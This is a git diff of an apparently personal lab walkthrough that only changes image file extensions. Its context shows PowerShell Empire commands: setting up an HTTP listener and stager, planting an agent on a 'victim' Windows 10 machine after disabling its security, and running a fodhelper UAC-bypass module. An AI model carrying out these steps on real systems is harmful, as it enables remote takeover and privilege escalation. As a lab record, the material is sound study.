@@ -23,49 +23,49 @@
 
 ### Run Listeners
 1. `(Empire)> listeners`
-> Output: ![info output](img/listeners-output.png)
+> Output: ![info output](img/listeners-output.PNG)
 2. `(Empire: listeners) > uselistener http`
 3. `(Empire:listeners/http) > info`
-> Output: ![listeners output](img/info-output.png)
+> Output: ![listeners output](img/info-output.PNG)
 
 4. `(Empire:listeners/http) > execute`
-> Output: ![execute output](img/execute-output.png)
+> Output: ![execute output](img/execute-output.PNG)
 
 5. `(Empire:listeners/http) > back`
 6. `(Empire:listeners) > listeners`
-> Output: ![listeners output](img/listeners-output-2.png)
+> Output: ![listeners output](img/listeners-output-2.PNG)
 
 ### Run the Stager
 1. `(Empire) > usestager multi/launcher`
 2. `(Empire: stager/multi/launcher) > set Listener http`
 3. `(Empire: stager/multi/launcher) > execute`
-> Output: ![stager execute output](img/stager-execute-output.png)
+> Output: ![stager execute output](img/stager-execute-output.PNG)
 
 ### Send agent to the victim
 1. Disable Windows Security
 2. Copy all the agent (text) to the victim (Windows 10), use Windows PowerShell by Administrator privileges
-> Output: ![agents check in output](img/new-agent-check-in.png)
+> Output: ![agents check in output](img/new-agent-check-in.PNG)
 
 ### Run agents (stagers/launcher module?)
 1. `(Empire) > agents`
-> Output: ![agents output](img/agents-output.png)
+> Output: ![agents output](img/agents-output.PNG)
 
 2. For easy read, rename the target (victim) `Empire: agents) > rename 5ETSB9W1 victim1`
 3. `(Empire: agents) > list`
-> Output: ![list agents output](img/list-agents.png)
+> Output: ![list agents output](img/list-agents.PNG)
 
 4. `(Empire: agents) > interact victim1`
 5. `(Empire: victim1) > info`
-> Output: ![victim1 info output](img/victim1-info.png)
+> Output: ![victim1 info output](img/victim1-info.PNG)
 
 6. `(Empire: victim1) > usemodule privesc/bypassuac_fodhelper`
 7. `(Empire: powershell/privesc/bypassuac_fodhelper) > info`
-> Output: ![info modul output](img/info-modul-pbf.png)
+> Output: ![info modul output](img/info-modul-pbf.PNG)
 
 8. `(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http`
 9. `(Empire: powershell/privesc/bypassuac_fodhelper) > execute`
 10. `[>] Module is not opsec safe, run? [y/N] y`
-> Output: ![execute modul output](img/execute-modul-pbf.png)
+> Output: ![execute modul output](img/execute-modul-pbf.PNG)
 
 ### Using Beagle
 1. Install and Run Docker (Kali Linux):
